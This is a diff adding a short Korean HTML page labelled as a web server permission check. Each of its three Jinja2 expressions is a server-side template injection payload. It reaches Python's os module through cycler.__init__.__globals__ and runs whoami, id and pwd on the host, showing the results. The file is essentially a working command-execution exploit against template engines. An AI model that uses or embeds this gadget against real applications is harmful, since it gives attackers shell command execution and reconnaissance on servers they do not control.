@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>웹서버 권한 확인</title>
+</head>
+<body>
+    <h1>웹서버 권한 확인</h1>
+
+    <h3>현재 웹서버 실행 사용자</h3>
+    <pre>{{ cycler.__init__.__globals__.os.popen('whoami').read() }}</pre>
+
+    <h3>현재 사용자/그룹 정보</h3>
+    <pre>{{ cycler.__init__.__globals__.os.popen('id').read() }}</pre>
+
+    <h3>현재 실행 경로</h3>
+    <pre>{{ cycler.__init__.__globals__.os.popen('pwd').read() }}</pre>
+</body>
+</html>
